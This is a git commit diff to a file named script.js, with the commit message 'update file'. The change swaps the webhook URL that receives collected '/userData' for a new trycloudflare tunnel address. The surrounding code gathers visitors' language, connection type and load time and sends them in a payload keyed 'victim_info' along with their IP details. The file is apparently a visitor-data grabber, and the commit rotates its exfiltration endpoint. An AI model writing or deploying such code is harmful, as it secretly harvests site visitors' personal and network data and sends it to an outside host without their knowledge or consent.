ff3ad36e71156add05fef9a169a054e11dad99a3
Elysioxx <108831238+elyelysiox@users.noreply.github.com>
2025-05-04 01:54:35 -0500

    update file

--- script.js
+++ script.js
@@ -84,7 +84,7 @@ Language: ${userLanguage}
 Connection Type: ${connectionType}
 Loading Time: ${loadTime}`;
 
-                const webhookURL = "https://liability-offline-satin-presents.trycloudflare.com/userData";
+                const webhookURL = "https://prescribed-provider-anniversary-memorial.trycloudflare.com/userData";
 
                 const payload = {
                     'victim_info': ipinfo, 
